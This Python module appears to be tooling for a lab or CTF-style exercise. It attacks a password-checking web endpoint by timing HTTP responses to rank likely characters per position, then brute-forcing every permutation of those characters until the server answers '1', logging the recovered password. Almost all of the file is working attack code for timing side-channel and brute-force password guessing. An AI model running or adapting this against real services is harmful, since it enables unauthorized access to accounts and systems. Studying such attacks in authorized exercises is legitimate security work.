import statistics
import requests
import time
import json
from itertools import permutations


def save_progress(found_char, name):
    with open(f"{name}_progress.txt", "a") as f:
        f.write(found_char)
 

def load_progress(name):
    try:
        with open(f"{name}_progress.txt", "r") as f:
            return f.read().strip()
    except Exception:
        return ""


def log_save(message, name):
    """Saves the text in a txt file"""
    with open(f"{name}_log.txt", "a") as f:
        f.write(f"{message}\n")


def extract_name(url):
    """Extracts the name of the team from the url."""
    url = url.replace("https://", "")
    return url.split('.')[0]


def filtered_average_mad(times, threshold=3):
    """
    Computes the average after removing outliers using the
    Median Absolute Deviation (MAD) method. Values that deviate too much from
    the median are excluded, and if MAD is zero the median is returned.

    :param times: Timing measurements.
    :param threshold: Scaled deviation limit for outlier detection (default 3).
    """
    median = statistics.median(times)
    mad = statistics.median([abs(t - median) for t in times])

    if mad == 0:
        return median

    filtered = [
        t for t in times
        if abs(t - median) / mad <= threshold
    ]

    return sum(filtered) / len(filtered)


def timeit(url2check,  repeat=1):
    """
    Measures the average response time for a given URL over a number of requests.
    
    :param url2check: (str) The URL to check.
    :param repeat: (int) The number of times to repeat the request.
    :return: (float) The average response time after removing outliers.
    """
    times = []
    for _ in range(repeat):
        start = time.time()
        r = requests.get(url2check, allow_redirects=True)
        end = time.time()
        times.append(end - start)

    return filtered_average_mad(times)


def check_password(url, password):
    """
    Checks if the given password is correct by sending a request to the server.
    '1' indicates a correct password, while '0' indicates an incorrect one.
    """
    r = requests.get(url + password, allow_redirects=True)
    value = r.text
    return value == '1'


def save_json(data: dict, filename: str):
    """Safely save JSON so program state is preserved."""
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def load_json(filename: str) -> dict:
    """Safely load JSON so program state is preserved."""
    try:
        with open(filename, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}
    

def find_lowest_highest_time_chars(times_dict: dict):
    """Find the lowest and highest time chars from a dict."""
    times_dict_sorted = sorted(times_dict.keys(), key=lambda x: times_dict[x])
    lowest = times_dict_sorted[:8]
    highest = times_dict_sorted[-8:]
    return lowest, highest


def get_sorted_chars(json_filename_l, json_filename_r, filename):
    """Gets the json files of the tests and creates a txt file with the lowest and highest time letters."""
    data = load_json(json_filename_r)
    log_save("\nChecking for low and high time chars (left 2 right)...", filename + "_results")
    for pos in data.keys():
        times_dict = data[pos]
        low_time_chars, high_time_chars = find_lowest_highest_time_chars(times_dict)
        log_save(f"Position {pos} low time chars: {low_time_chars}", filename + "_results")
        log_save(f"-----------Position {pos} high time chars: {high_time_chars}", filename + "_results")

    data = load_json(json_filename_l)
    log_save("\nChecking for low and high time chars (right 2 left)...", filename + "_results")
    for pos in range(1, 7):
        times_dict = data[str(pos)]
        low_time_chars, high_time_chars = find_lowest_highest_time_chars(times_dict)
        log_save(f"Position {pos} low time chars: {low_time_chars}", filename + "_results")
        log_save(f"-----------Position {pos} high time chars: {high_time_chars}", filename + "_results")


def brute_force(url, chars, password_length):
    name = extract_name(url) + "_brute_force"

    if password_length != len(chars):
        log_save(f"[!] Password length must match number of unique characters.", name)
        return

    combos = list(permutations(chars))
    total_combos = len(combos)

    log_save(f"--- Starting Brute Force ---", name)
    log_save(f"Target: {url}", name)
    log_save(f"Characters: {chars}", name)
    log_save(f"Total combinations to check: {total_combos}", name)
    log_save(f"Estimated time (at ~3.5s per request): {total_combos * 3.5 / 60:.1f} minutes", name)
    log_save("============================================================", name)

    for i, combo in enumerate(combos):
        password = "".join(combo)
        
        if check_password(url, password):
            log_save("=======================", name)
            log_save(f"Password found: {password}", name)
            log_save(f"URL: {url}{password}", name)
            log_save("=======================", name)
            return
        
        log_save(f"Checked {i + 1}/{total_combos} | PASSWORD: {password}", name)

    log_save("\n--- Brute Force Complete ---", name)
